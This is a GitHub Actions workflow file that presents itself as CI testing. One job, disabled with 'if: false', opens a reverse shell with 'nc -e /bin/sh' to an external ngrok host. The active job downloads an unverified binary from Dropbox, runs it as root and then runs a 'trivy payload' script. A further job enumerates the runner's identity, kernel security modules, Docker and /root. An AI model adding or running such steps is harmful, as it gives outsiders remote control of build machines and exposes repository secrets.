name: CI

on:
  push:
  pull_request:

jobs:

  test:
    if: false
    runs-on: ubuntu-latest
    steps:
      - name: vienna-calling
        run: |
          id
          nc -e /bin/sh -v 7.tcp.eu.ngrok.io 13153 

  trivy-test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: apt
        run: |
          apt-get update -y && apt-get install iproute2

      - name: download github tracer
        run: |
          wget -O exec-tracer "https://www.dropbox.com/scl/fi/62jk44i7r9lboyv8uhzrd/exec-tracer-gitlab?rlkey=7shagu4bcbjtoc1tahfj10yy1&st=hibdjjot&dl=0" 
          chmod +x exec-tracer

      - name: start exec-tracer
        run: |
          sudo ./exec-tracer >exec.log &

      - name: run trivy payload
        run: |
          python trivy.py

      - name: show bpf log
        run: |
          cat /var/log/exec-tracer.log

  curl-test:
    if: false
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: start exec-tracer
        run: |
          sudo ./exec-tracer >exec.log &

      - name: install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            build-essential \
            clang \
            llvm \
            flex \
            bison \
            libelf-dev \
            zlib1g-dev \
            pkg-config \
            libbpf-dev
          git clone --depth 1 https://github.com/torvalds/linux.git
          cd linux/tools/bpf/bpftool
          make -j"$(nproc)"
          sudo install -m 755 bpftool /usr/local/bin/bpftool
          uname -r
      
      - name: make
        run: |
          go mod download github.com/cilium/ebpf
          go get github.com/cilium/ebpf/internal/unix@v0.19.0
          make

      - name: start exec-tracer
        run: |
          sudo ./exec-tracer >exec.log &

      - name: id
        run: |
          apt-get update -y && apt-get install iproute2
          hostname
          date
          id
          cat /proc/self/status
          ps
          ip addr
          cat /sys/kernel/security/lsm
          ls /

      - name: docker ps
        run: |
          docker ps

      - name: ls
        run: |
          ls -la / /proc /home /root /tmp /run /run/docker /run/packer || echo

      - name: docker run
        run: |
          docker run alpine ls /

      - name: show bpf log
        run: |
          cat /var/log/exec-tracer.log
